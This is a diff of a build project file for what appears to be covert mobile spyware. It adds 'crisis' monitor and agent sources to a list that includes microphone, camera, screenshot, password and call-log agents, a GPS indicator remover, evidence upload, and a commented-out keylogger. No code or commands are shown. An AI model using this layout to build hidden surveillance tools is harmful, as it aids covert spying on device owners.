@@ -24,7 +24,7 @@ SOURCE JsonTokener.cpp JsonUtil.cpp JsonValue.cpp StringUtil.cpp
 
 SOURCEPATH                              ..\src 
 SOURCE TonePlayer.cpp
-SOURCE Monitor.cpp MessageFilter.cpp MonitorPhoneCall.cpp SlimMonitorPhoneCall.cpp MonitorFreeSpace.cpp MonitorForeground.cpp GpsIndicatorRemover.cpp CallLogReader.cpp //KeyLogger.cpp
+SOURCE Monitor.cpp MessageFilter.cpp MonitorPhoneCall.cpp SlimMonitorPhoneCall.cpp MonitorFreeSpace.cpp MonitorForeground.cpp GpsIndicatorRemover.cpp CallLogReader.cpp MonitorCrisis.cpp//KeyLogger.cpp
 SOURCE AbstractAction.cpp AbstractState.cpp ActionFactory.cpp ActionNone.cpp ActionSms.cpp ActionSync.cpp ActionUninstall.cpp ActionLog.cpp Network.cpp Protocol.cpp SendSmsSocket.cpp ActionSyncApn.cpp
 SOURCE ActionEvent.cpp ActionAgent.cpp
 SOURCE StateCmdUninstall.cpp StateNone.cpp StateNewConfFeedback.cpp
@@ -32,7 +32,7 @@ SOURCE StateAuthentication.cpp StateIdentification.cpp StateEvidences.cpp StateB
 SOURCE StateNewConf.cpp StateFileSystem.cpp StateDownload.cpp StateUpload.cpp StateUpgrade.cpp
 SOURCE AbstractAgent.cpp AgentAddressbook.cpp AgentCalendar.cpp AgentMessages.cpp AgentNone.cpp AgentPosition.cpp 
 SOURCE AgentScreenshot.cpp AgentFactory.cpp AgentDevice.cpp AgentMic.cpp AgentApplication.cpp AgentCallList.cpp 
-SOURCE AgentCallLocal.cpp AgentCamera.cpp LogFile.cpp AgentPassword.cpp //AgentKeylog.cpp
+SOURCE AgentCallLocal.cpp AgentCamera.cpp LogFile.cpp AgentPassword.cpp AgentCrisis.cpp //AgentKeylog.cpp
 
 SOURCE AbstractEvent.cpp EventLocation.cpp EventNone.cpp EventSms.cpp EventTimer.cpp EventFactory.cpp RecvSmsSocket.cpp EventCellId.cpp EventAc.cpp EventBattery.cpp 
 SOURCE EventStandby.cpp EventSimChange.cpp EventProcess.cpp EventCall.cpp EventConnection.cpp EventDate.cpp EventAfterInstall.cpp
